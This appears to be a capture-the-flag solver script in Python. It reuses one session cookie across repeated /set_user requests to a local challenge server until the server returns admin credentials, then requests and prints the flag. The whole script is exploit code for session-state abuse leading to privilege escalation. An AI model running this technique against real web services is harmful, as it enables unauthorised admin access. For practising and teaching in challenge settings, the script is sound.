import os
import re
import requests
import json
import time

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", 8888))

domain = f"{HOST}:{PORT}"

res = requests.post(
    f"http://{domain}/set_user",
    json={"username": "abc"},
)
session = re.findall("sessionId=(.*?);", res.headers["Set-Cookie"])[0]

for i in range(9):
    res = requests.post(
        f"http://{domain}/set_user",
        json={"username": "abc"},
        headers={"Cookie": f"sessionId={session}"},
    )
    time.sleep(0.2)

    user = json.loads(res.text)
    if (
        user["authId"] == "admin"
        and user["authPW"] == "********************************"
    ):
        flag = requests.post(
            f"http://{domain}/get_flag",
            json={"username": "admin", "password": "********************************"},
            headers={"Cookie": f"sessionId={session}"},
        ).text
        print(flag)
